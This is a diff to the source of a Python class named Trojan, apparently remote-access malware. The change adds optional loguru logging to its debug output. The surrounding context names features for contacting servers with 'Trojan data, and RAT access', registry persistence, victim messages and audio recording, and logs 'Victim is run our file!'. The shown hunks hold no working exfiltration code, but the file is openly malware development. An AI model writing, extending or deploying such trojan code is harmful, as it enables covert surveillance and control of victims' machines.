@@ -47,6 +47,9 @@ class Trojan:
         # You need just place first priority server in the first index of it.
         self.__server_url = None
 
+        # Is loguru module is enabled or not? (Installed or not, you may not change this variable).
+        self.__loguru_is_enabled = None
+
         # List of the all servers urls that may be active or not,
         # Write there all URLs which will be used for sending
         # Trojan data, and RAT access.
@@ -68,6 +71,9 @@ class Trojan:
 
         # Should we show victim a message or not.
         self.__setting_show_message = False
+
+        # Should we enable loguru if it is exists?
+        self.__setting_enable_loguru = True
 
         # Should we show debug messages or not.
         self.__setting_show_debug_messages = True
@@ -127,8 +133,22 @@ class Trojan:
         if self.__setting_show_debug_messages:
             # If enabled.
 
-            # Showing message.
-            print(f"[Trojan] {message}")
+            # Getting debug message text.
+            text = f"[Trojan] {message}"
+
+            if self.__loguru_is_enabled:
+                # Loguru message.
+
+                # Importing.
+                from loguru import logger
+
+                # Showing message.
+                logger.info(text)
+            else:
+                # Printed message.
+
+                # Showing message.
+                print(text)
 
     def push_self_to_registry(self) -> None:
         """
@@ -696,11 +716,46 @@ class Trojan:
         file.writeframes(b''.join(frames))
         file.close()
 
+    def try_import_loguru(self):
+        """
+        Trying to import loguru in system.
+        :return: [None] Not returns anything.
+        """
+
+        if not self.__loguru_is_enabled:
+            # If not arleady enabled.
+
+            try:
+                from loguru import logger
+
+                # Enabling loguru.
+                self.__loguru_is_enabled = True
+
+                # Showing debug message.
+                self.show_debug_message("Imported loguru!")
+            except ImportError:
+                # If error - disabling.
+                self.__loguru_is_enabled = False
+                self.__setting_enable_loguru = False
+
+                # Showing debug message.
+                self.show_debug_message("Couldn't import loguru as is not installed in system, please disable it.")
+
     def run(self) -> None:
         """
         Launches trojan by executing all needed methods.
         :return: [None] Not returns anything.
         """
+
+        # Trying to connect loguru.
+        if self.__setting_enable_loguru:
+            # If enabled.
+
+            # Importing.
+            self.try_import_loguru()
+
+        # Showing debug message.
+        self.show_debug_message("Victim is run our file!")
 
         # Generating URI.
         if self.__server_unique_request_index is None:
@@ -710,9 +765,6 @@ class Trojan:
 
                 # Generating URI.
                 self.generate_unique_request_index()
-
-        # Showing debug message.
-        self.show_debug_message("Victim is run our file!")
 
         # Checking server urls, and selecting main for making requests.
         self.check_server_urls()
